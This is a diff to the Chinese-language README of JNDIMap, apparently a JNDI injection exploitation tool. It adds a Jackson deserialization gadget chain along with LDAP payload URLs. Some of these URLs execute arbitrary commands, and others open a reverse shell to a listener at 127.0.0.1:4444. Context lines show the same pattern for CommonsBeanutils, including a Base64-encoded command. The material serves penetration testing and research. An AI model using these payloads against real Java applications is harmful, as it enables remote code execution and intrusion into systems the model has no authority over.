@@ -304,7 +304,11 @@ Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>
 
 即 LDAP 反序列化, 不支持 RMI 协议
 
-JNDIMap 内置 CommonsCollections K1-K4 和 CommonsBeanutils 利用链 (1.8.3 + 1.9.4), 同时也支持自定义数据反序列化
+JNDIMap 内置以下利用链, 同时也支持自定义数据反序列化
+
+- CommonsCollections K1-K4
+- CommonsBeanutils (1.8.3 + 1.9.4)
+- Jackson
 
 ```bash
 # 自定义数据反序列化
@@ -338,6 +342,11 @@ ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/ReverseShell/127.0.0.1/444
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/ReverseShell/127.0.0.1/4444
+
+# Jackson 原生反序列化
+# 使用 JdkDynamicAopProxy 优化不稳定性问题, 需要 spring-aop 依赖
+ldap://127.0.0.1:1389/Deserialize/Jackson/Command/open -a Calculator
+ldap://127.0.0.1:1389/Deserialize/Jackson/ReverseShell/127.0.0.1/4444
 ```
 
 ## Reference
@@ -345,6 +354,8 @@ ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/ReverseShell/127.0.0.1/444
 [https://tttang.com/archive/1405/](https://tttang.com/archive/1405/)
 
 [https://paper.seebug.org/1832/](https://paper.seebug.org/1832/)
+
+[https://xz.aliyun.com/t/12846](https://xz.aliyun.com/t/12846)
 
 [http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce](http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce)
 
